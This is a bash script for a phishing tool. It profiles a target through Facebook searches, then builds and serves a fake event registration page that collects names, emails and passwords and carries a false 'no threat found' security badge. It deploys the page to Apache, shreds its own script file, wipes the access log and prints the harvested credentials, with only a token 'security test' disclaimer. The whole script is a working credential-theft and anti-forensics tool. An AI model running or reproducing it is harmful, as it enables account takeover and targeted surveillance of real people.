#!/bin/bash

bar ()
{
BAR='=  =  =  =  \e[01;32m=  =  =  =  =  \e[00;34m !'    
                         
for i in {0..59}; do
    echo -ne "\r${BAR:0:$i}" 
    sleep 0.04
done
}

echo -e "\e[00;31m-----------"
echo -e "\e[01;33mThis module exploit the habit of people to use one password for all services\e[00m"
echo -e "\e[00;31m-----------\e[00m"
sleep 1
echo -e "\e[00;33mScript developed just for security test use, 
the author decline any responsability for any illegal use of it.\e[00m"
echo " "
echo -e "\e[00;32mEnter a command for start if you have understard the conditions: \e[00m"
read
clear
bar
echo " "
echo " "
echo -e "\e[01;38m------------------------------------------------------------"
echo -e "\e[01;34mSearch for interests and events about the target on Facebook"
echo -e "Create a phishing scenario with a event page of interest"
echo -e "\e[01;38m------------------------------------------------------------\e[00m"
echo " "
sleep 0.7

bar
echo " "
echo -e "\e[01;36mDo you want search info on Facebook?\e[00;32m (y/n)\e[00m"
read siono

if [[ "$siono" = "y" ]]
		then
		echo " "
		echo -e "\e[00;34mEnter FB ID of the target (you can use findmyfbid.com or https://github.com/guelfoweb/fbid"
		read idt
		sleep 0.5
		echo -e "\e[00;32mOpen Firefox with your FB agent (must be US lang), press ENTER when ready: "
		read
		echo " "
		echo "Enter year of event: "
		read anno
		echo -e "Searching for stories liked and events ($anno) of the target with FB graph intersect...\e[00m"
firefox https://www.facebook.com/search/012001201003/stories-liked https://www.facebook.com/search/str/$idt/events//$anno/events/intersect/ &
clear

elif [[ "$siono" = "n" ]]
then
echo " "
echo -e "\e[00;33mSkipping FB recon\e[00m"
echo " "
clear

		else 
		echo -e "\e[01;31mYou must choose y or n -- exiting"
		sleep 1.3
		exit
		
fi		

echo " "
echo -e "\e[01;34mCreating an interesting scam-page for the target\e[00m"
sleep 0.7

echo " "
echo "Insert title for event of interest: "
read argom
echo "Insert description for the registration: "
read desc
echo "Insert background image (placed in this directory) "
read immag

cat > index.html << EOF
<form action="processo.php" method="POST">
<body background="$immag">
<p>=========================</p>

<h1 align=center style="color:blue;">$argom</h1>

<p class="big">
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 <br>
 <br>
</p>
 
<p style="color:red;">$desc</p>

<p>=========================</p>

    <input name="field1" type="text" placeholder="Name"/>

<p>---</p>
    <input name="field2" type="text" placeholder="Email"/>
<p>    
    Password:<br>
    <input name="field3" type="text" STYLE="background-color:white; color: #FFFFFF" placeholder="Password"/>
    
    <input type="submit" name="submit" value="Go">
</form>


<p class="big">
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
  <br>
 <br>
</p>

<div class="alert">
  <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
  <strong>Secure!</strong> No threat found by htmlcode-antivirus * auto websag service label for your security
</div>

</body>
</html>

<p>---</p>

</form>
EOF

pwd > dir.txt
backd=$(cat dir.txt)

cp * /var/www/html
cd /var/www/html
shred -n 7 -u -z event.sh > /dev/null
shred -u -z dir.txt > /dev/null
cd $backd

shred -u dir.txt > /dev/null

chown -R root /var/www/html
chmod 755 /var/www/html

service apache2 restart
sleep 2

echo " "
echo -e "\e[00;33mAll data in apache log will be erased, press ENTER\e[00m: "
read
echo "DEVICE CONNECTED: " > /var/log/apache2/access.log
sleep 1
echo " "
xterm -e tail -f /var/log/apache2/access.log &
echo -e "\e[01;32mWhen you see contacts press ENTER\e[00m: "
read 
sleep 2
echo " "
cd
cd /tmp
ls > prl.txt
cat prl.txt | grep apache2 > ap.txt
dire=$(cat ap.txt)
cd $dire
cd tmp


echo -e "\e[01;32mTracking data...\e[00m"
sleep 0.5
echo -e "\e[00;31m"
bar
echo " "
sleep 0.2
echo " "
echo -e "\e[01;36m"
cat mydata.txt
echo -e "\e[00m"
echo " "
service apache2 stop
echo -e "\e[01;32mFinish\e[00m"

